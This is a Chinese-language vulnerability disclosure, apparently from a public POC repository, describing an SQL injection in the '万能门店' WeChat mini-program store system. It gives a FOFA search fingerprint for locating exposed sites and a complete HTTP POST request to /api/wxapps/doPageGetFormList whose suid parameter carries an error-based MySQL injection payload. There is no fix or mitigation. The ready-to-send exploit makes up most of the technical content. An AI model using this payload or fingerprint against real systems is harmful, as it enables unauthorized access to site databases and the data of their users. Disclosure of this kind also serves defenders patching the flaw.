# 微信万能门店小程序系统存在SQL注入漏洞

# 一、漏洞简介
万能门店微信小程序不限制小程序生成数量，支持多页面，预约功能等。 本套源码包含多商户插件、点餐插件、拼团插件、积分兑换、小程序手机客服等全套十个插件模块。支持后台一键扫码上传小程序，和后台通用模板。微信万能门店小程序系统存在SQL注入漏洞

# 二、影响版本
+ 微信万能门店小程序系统

# 三、资产测绘
+ fofa`<font style="color:rgb(221, 17, 68);">"/comhome/cases/index.html"</font>`
+ 特征


# 四、漏洞复现
```java
POST /api/wxapps/doPageGetFormList HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
 
suid=' AND GTID_SUBSET(CONCAT((SELECT (VERSION()))),1)-- bdmV
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pg8al3o5uwx56x74>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
